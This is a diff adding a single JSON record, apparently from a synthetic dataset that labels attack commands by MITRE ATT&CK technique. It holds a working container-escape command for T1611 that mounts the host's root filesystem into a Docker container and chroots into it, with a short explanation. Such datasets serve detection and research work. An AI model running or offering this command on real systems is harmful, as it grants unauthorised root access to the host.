@@ -1,0 +1,21 @@
+{
+  "id": "SYN-BASH-T1611-1356d1fb-105f2452",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "docker run -v /:/host --rm -it alpine chroot /host",
+  "explanation": "This command runs a temporary Docker container with the host's root filesystem mounted, allowing access to the host from within the container.",
+  "rationale_steps": [
+    "Use Docker to create a new container.",
+    "Mount the host's root filesystem to interact directly with the host's files."
+  ],
+  "source_prompt_hash": "1356d1fb",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:27:59.937327Z"
+}
